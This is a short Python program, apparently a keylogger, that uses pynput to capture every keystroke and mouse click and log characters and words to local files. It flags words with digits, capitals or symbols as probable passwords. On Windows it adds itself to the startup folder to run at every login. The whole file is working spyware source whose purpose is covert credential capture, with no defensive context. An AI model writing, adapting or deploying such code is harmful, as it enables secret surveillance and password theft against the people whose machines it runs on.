import threading
import time
import os
import sys
import logging
import platform
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from auto_start import add_to_startup_folder

system = platform.system()
if system == "Windows":
    current_directory = os.getcwd()
    exe_name = os.path.basename(sys.argv[0])
    result = add_to_startup_folder(f"{current_directory}\\{exe_name}")


# Lista de teclas especiales
special_caracters_list = [
    "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/",
    ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "{", "|", "}",
    "~"
]

logging_format = logging.Formatter('%(asctime)s:%(message)s')

logger_characters = logging.getLogger("Characteres")
logger_words = logging.getLogger("Words")
logger_posible_paswords = logging.getLogger("Passwords")

logger_characters.setLevel(logging.DEBUG)
logger_words.setLevel(logging.DEBUG)
logger_posible_paswords.setLevel(logging.DEBUG)

# Handler para caracteres
handler_characters = logging.FileHandler("characters.log")
handler_characters.setFormatter(logging_format)
logger_characters.addHandler(handler_characters)

# Handler para palabras
handler_words = logging.FileHandler("words.log")
handler_words.setFormatter(logging_format)
logger_words.addHandler(handler_words)

# Handler para posibles passwords
handler_posible_passwords = logging.FileHandler("posible_passwords.log")
handler_posible_passwords.setFormatter(logging_format)
logger_posible_paswords.addHandler(handler_posible_passwords)

current_word = ""
has_special_character = False


def on_press(key):
    global current_word
    global has_special_character

    try:
        current_word += key.char
        logger_characters.info(key.char)
        if key.char in special_caracters_list:
            has_special_character = True

    except AttributeError:
        if key in [Key.space, Key.enter, Key.tab]:
            if current_word.strip():
                logger_words.info(current_word)
                has_uppercase = any(c.isupper() for c in current_word)
                has_number = any(c.isdigit() for c in current_word)
                if has_special_character or has_uppercase or has_number:
                    logger_posible_paswords.info(current_word)

            current_word = ""
            has_special_character = False


def on_click(x, y, button, pressed):
    if pressed:
        time.sleep(0.1)
        global current_word
        global has_special_character
        if button.name == "left" and current_word.strip():
            logger_words.info(current_word)
            has_uppercase = any(c.isupper() for c in current_word)
            has_number = any(c.isdigit() for c in current_word)
            if has_special_character or has_uppercase or has_number:
                logger_posible_paswords.info(current_word)
            current_word = ""
            has_special_character = False


def start_keyboard():
    with Listener(on_press=on_press) as listener:
        listener.join()


def start_mouse():
    with MouseListener(on_click=on_click) as listener:
        listener.join()


if __name__ == "__main__":
    t1 = threading.Thread(target=start_keyboard)
    t2 = threading.Thread(target=start_mouse)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
